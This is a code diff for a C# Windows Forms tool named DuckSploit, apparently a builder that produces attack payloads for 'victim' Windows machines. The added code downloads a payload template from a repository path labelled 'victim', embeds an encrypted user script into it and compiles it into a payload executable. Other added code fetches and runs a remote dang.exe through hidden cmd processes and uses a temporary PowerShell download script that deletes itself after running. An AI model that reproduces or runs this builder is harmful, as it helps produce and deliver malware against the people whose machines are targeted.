@@ -174,13 +174,34 @@ namespace dsforms {
 		private void build(object source, EventArgs e) {
 			string userprofile = System.Environment.GetEnvironmentVariable("USERPROFILE");
 			string tempdir = System.Environment.GetEnvironmentVariable("TEMP");
+			try
+			{
+				Directory.CreateDirectory(userprofile+"\\DuckSploit\\generated");
+			}
+			catch (Exception ea)
+			{}
+			try
+			{
+				File.Delete(tempdir + "\\dscutompayload.cs");
+			}
+			catch (Exception eab)
+			{}
 			
-			dscrypter dscrypter = new dscrypter();
-			// textBox.Text = dscrypter.dec(textBox.Text);
-			Download("", tempdir+"\\dscutompayload.cs");
-			// File.WriteAllText(userprofile+"\\DuckSploit\\last_script.dang", textBox.Text);
-            MessageBox.Show("Builed!");
-			// dscrypter.dec(textBox.Text)
+			if (File.Exists(@"C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\csc.exe")) {
+				dscrypter dscrypter = new dscrypter();
+				Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/victim/windows/DScustom.cs", tempdir + "\\dscutompayload.cs");
+					
+				string text = File.ReadAllText(tempdir + "\\dscutompayload.cs");
+				text = text.Replace("%your_dang_payload%", dscrypter.enc(textBox.Text.Trim()));
+				File.WriteAllText(tempdir + "\\dscutompayload.cs", text);
+				execute_cmd("call %windir%\\Microsoft.NET\\Framework\\v3.5\\csc.exe /out:%userprofile%\\DuckSploit\\generated\\DSWindows_custom_payload.exe %temp%\\dscutompayload.cs");
+				MessageBox.Show("Builed!");
+				execute_cmd("start %userprofile%\\DuckSploit\\generated");
+			}
+			else
+			{
+				MessageBox.Show("/!\\ MICROSOFT.NET version v3.5 isn't installed on your computer, please install it to build windows payload");
+			}
         }
 		private static void execute_cmd(string cmd)
         {
@@ -203,8 +224,8 @@ namespace dsforms {
         }
 		private static void Download(string url, string outPath)
 		{
-			// string tempdir = Path.GetTempPath();
-			string tempdir = "./";		
+			string tempdir = Path.GetTempPath();
+			// string tempdir = "./";		
 			
 			
 			url = '"' + url + '"';
@@ -213,7 +234,7 @@ namespace dsforms {
 			
 			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
 			
-			outPath = tempdir + "/download.ps1";
+			outPath = tempdir + "\\download.ps1";
 			
             // open or create file
             FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
@@ -221,7 +242,7 @@ namespace dsforms {
             StreamWriter streamwrite = new StreamWriter(streamfile);
             // add some lines
 			
-			outPath = '"' + tempdir + "/download.ps1" + '"';
+			outPath = '"' + tempdir + "\\download.ps1" + '"';
 			
 			
 			// string powershelldownloadtxt = "" + url +"\  "
@@ -262,9 +283,7 @@ namespace dsforms {
         private void DisplayGUI() {
 			string userprofile = System.Environment.GetEnvironmentVariable("USERPROFILE");
 			string tempdir = System.Environment.GetEnvironmentVariable("TEMP");
-			Download("", tempdir+"\\dang.exe");
-			
-			
+			Download("https://github.com/canarddu38/Dang/raw/main/dang.exe", tempdir+"\\dang.exe");
 			
 			this.BackColor = Color.FromArgb(50, 50, 50);
             this.Name = "DS - Terminal";
@@ -297,7 +316,9 @@ namespace dsforms {
             terminal.ForeColor = Color.White;
             terminal.BackColor = Color.Black;
             terminal.Font = LargeFont;
-			terminal.Text = @"DANG V1.0";
+			terminal.Text = @"DANG - V1.0
+DuckpvpTeam 2022
+";
             terminal.Size = new Size(980, 450);
             terminal.Location = new Point(0, (this.Height - 560));
 			// 
@@ -328,7 +349,7 @@ namespace dsforms {
             button.Text = "Load last";
             button.Size = new Size(430, 50);
             button.Location = new Point(5, (this.Height - 100));
-            button.Click += new System.EventHandler(this.execute_dang);
+            // button.Click += new System.EventHandler(this.execute_dang);
 			button.FlatStyle = FlatStyle.Flat;
 			button.FlatAppearance.BorderSize = 0;
 
@@ -338,23 +359,44 @@ namespace dsforms {
             this.Controls.Add(textBox);
         }
 		private void input_KeyDown(object sender, KeyEventArgs e) 
-		{                        
+		{		
 			if(e.KeyData == Keys.Enter)   
 			{  
-				textBox.get
+				string input = textBox.Text.Trim();
+				terminal.Text = "\n"+execute_dang(input);
+				textBox.Text = "";
 			}             
 		}
-        private void execute_dang(object source, EventArgs e) {
+        private string execute_dang(string input) {
+			string tempdir = Path.GetTempPath();
+			if (!File.Exists(tempdir+"\\dang.exe"))
+			{
+				terminal.Text += "\n"+"Downloading DANG...";
+				Download("https://github.com/canarddu38/Dang/raw/main/dang.exe", tempdir+"\\dang.exe");
+				terminal.Text += "\n"+"[o] Done";
+			}
+			
+			File.WriteAllText(tempdir+"\\dangscript.dang", input);
+			
 			ProcessStartInfo processInfo;
 			Process process;
-			
-			processInfo = new ProcessStartInfo("cmd.exe", "");
+			processInfo = new ProcessStartInfo("cmd.exe", "/c "+tempdir+"\\dang.exe %temp%\\dangscript.dang & exit");
 			processInfo.CreateNoWindow = true;
 			processInfo.UseShellExecute = false;
 			processInfo.RedirectStandardOutput = true;
 			process = Process.Start(processInfo);
 			process.WaitForExit();
 			string output = process.StandardOutput.ReadToEnd();
+			// while (!File.Exists(tempdir+"\\dangoutput.txt"))
+			// {}
+			// string output = File.ReadAllText(tempdir+"\\dangoutput.txt");
+			// try
+			// {
+				// File.Delete(tempdir+"\\dangscript.dang");
+			// }
+			// catch (Exception e)
+			// {}
+			return output;
         }
 		private static void execute_cmd(string cmd)
         {
@@ -372,13 +414,11 @@ namespace dsforms {
 			processInfo.UseShellExecute = false;
 			processInfo.RedirectStandardOutput = true;
 			process = Process.Start(processInfo);
-			process.WaitForExit();
-			output = process.StandardOutput.ReadToEnd();
         }
 		private static void Download(string url, string outPath)
 		{
-			// string tempdir = Path.GetTempPath();
-			string tempdir = "./";		
+			string tempdir = Path.GetTempPath();
+			// string tempdir = "./";		
 			
 			
 			url = '"' + url + '"';
@@ -387,7 +427,7 @@ namespace dsforms {
 			
 			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
 			
-			outPath = tempdir + "/download.ps1";
+			outPath = tempdir + "\\download.ps1";
 			
             // open or create file
             FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
@@ -395,7 +435,7 @@ namespace dsforms {
             StreamWriter streamwrite = new StreamWriter(streamfile);
             // add some lines
 			
-			outPath = '"' + tempdir + "/download.ps1" + '"';
+			outPath = '"' + tempdir + "\\download.ps1" + '"';
 			
 			
 			// string powershelldownloadtxt = "" + url +"\  "
@@ -418,7 +458,7 @@ namespace dsforms {
 			processInfo.UseShellExecute = false;
 			processInfo.RedirectStandardOutput = true;
 			process = Process.Start(processInfo);
-			process.WaitForExit();		
+			process.WaitForExit();
 			execute_cmd("if exist " + tempdir + "\\download.ps1 (del " + tempdir + "\\download.ps1)");
 		}
     }
